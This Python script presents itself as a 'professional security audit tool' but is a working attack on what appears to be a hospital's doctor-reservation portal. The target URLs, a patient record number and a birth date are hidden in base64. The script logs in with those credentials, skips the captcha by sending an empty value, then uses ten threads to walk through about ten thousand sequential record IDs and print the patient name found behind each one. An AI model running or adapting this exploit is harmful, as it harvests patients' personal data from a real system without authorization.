import requests
from bs4 import BeautifulSoup
import base64
from concurrent.futures import ThreadPoolExecutor

# Internal Core Helper
def _decode(data):
    return base64.b64decode(data).decode('utf-8')

def show_banner():
    banner = r"""
    ██████╗ ██╗      ██████╗ ██████╗  █████╗ ██╗  ██╗ █████╗ ████████╗
    ██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔══██╗╚══██╔══╝
    ██████╔╝██║     ██║   ██║██████╔╝███████║███████║███████║   ██║   
    ██╔══██╗██║     ██║   ██║██╔══██╗██╔══██║██╔══██║██╔══██║   ██║   
    ██████╔╝███████╗╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║   ██║   
    ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    ==================================================================
    [!] BLORAHAT V2.0 - PROFESSIONAL SECURITY AUDIT TOOL
    [!] TARGET : ..... .........
    [!] EXPLOIT: CAPTCHA BYPASS & IDOR DATA LEAKAGE
    ==================================================================
    """
    print(f"\033[92m{banner}\033[0m")

# Encrypted System Credentials
NO_RM = _decode("MDA1MTA0ODE=")
TGL_LAHIR = _decode("MzExMjE5NjA=")
URL_HAL_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbg==")
URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbl9hY3Rpb24=")
BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")

session = requests.Session()

def login():
    print("[*] Initiating Security Audit: Captcha Bypass Testing...")
    try:
        get_page = session.get(URL_HAL_LOGIN)
        soup_login = BeautifulSoup(get_page.text, 'html.parser')
        input_t = soup_login.find('input', {'name': 't'})
        token_t = input_t.get('value') if input_t else ""

        # Bypass Captcha Testing: Sending empty string to 'c' parameter
        payload = {'u': NO_RM, 'p': TGL_LAHIR, 'c': '', 't': token_t}
        res = session.post(URL_ACTION_LOGIN, data=payload)
        
        if "login" in res.url:
            print("[\033[91m!\033[0m] Access Denied: Captcha verification required.")
            return False
        print("[\033[92m+\033[0m] Exploit Success: Captcha Bypassed. Session Token Hijacked.")
        return True
    except:
        return False

def fetch_data(id_num):
    formatted_id = str(id_num).zfill(12)
    url = BASE_TARGET_URL + formatted_id
    
    try:
        # Timeout 5 detik agar tidak nyangkut jika server lambat
        res = session.get(url, timeout=5)
        soup = BeautifulSoup(res.text, 'html.parser')
        
        nama_tag = soup.find('p', class_='sale-price text-success')
        if not nama_tag:
            return

        # IDOR Testing: If nama_tag is found, it indicates a valid RM ID and data leakage
        print(f"[\033[92m+\033[0m] IDOR Success: Found Valid RM ID {formatted_id} for {nama_tag.get_text(strip=True)}")

    except:
        print(f"[\033[91m!\033[0m] RM ID {formatted_id}: Not Found or Error Occurred.")

def start_process(start_range, end_range):
    show_banner()
    if login():
        print(f"[*] Starting IDOR Scan for Doctor Reservations from range {start_range} to {end_range}...\n")
        with ThreadPoolExecutor(max_workers=10) as executor: # Increased workers for faster scanning
            executor.map(fetch_data, range(start_range, end_range + 1))
        print("\n[*] IDOR Audit Completed for Doctor Reservations.")

if __name__ == "__main__":
    AWAL = int(_decode("NTAwMDAw"))
    AKHIR = int(_decode("NTEwNTAw"))
    start_process(AWAL, AKHIR)
